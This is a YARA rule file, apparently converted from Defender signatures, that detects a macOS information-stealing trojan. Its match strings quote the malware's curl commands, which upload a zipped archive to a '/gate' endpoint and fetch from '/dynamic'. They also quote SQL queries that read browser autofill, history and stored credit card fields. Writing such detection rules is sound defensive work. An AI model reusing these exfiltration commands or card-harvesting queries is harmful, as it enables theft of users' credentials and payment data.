rule Trojan_MacOS_Stealer_AMTB_2147962154_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:MacOS/Stealer!AMTB"
        threat_id = "2147962154"
        type = "Trojan"
        platform = "MacOS: "
        family = "Stealer"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "curl -k -s -H \"api-key: %s\" https://%s/dynamic" ascii //weight: 2
        $x_2_2 = "curl -k -X POST -H \"api-key: %s\" -H \"cl: 0\" --max-time 300 -F \"file=@/tmp/osalogging.zip\" -F \"buildtxd=%s\" https://%s/gate" ascii //weight: 2
        $x_2_3 = "5190ef1733183a0dc63fb623357f56d6" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_MacOS_Stealer_AMTB_2147962154_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:MacOS/Stealer!AMTB"
        threat_id = "2147962154"
        type = "Trojan"
        platform = "MacOS: "
        family = "Stealer"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "encrypted_tokenservice/Documents/Downloads/data/tmpccaSELECT name, value FROM autofill" ascii //weight: 1
        $x_1_2 = "/Documents/Downloads/data/tmpchhSELECT title, url, visit_count FROM urls" ascii //weight: 1
        $x_1_3 = "titlevisit_count/Documents/Downloads/data/tmpccSELECT name_on_card" ascii //weight: 1
        $x_1_4 = "card_number_encrypted, expiration_month, expiration_year FROM credit_cards" ascii //weight: 1
        $x_1_5 = "overflowtrailerspasswordfragmentif-matchif-rangelocation" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

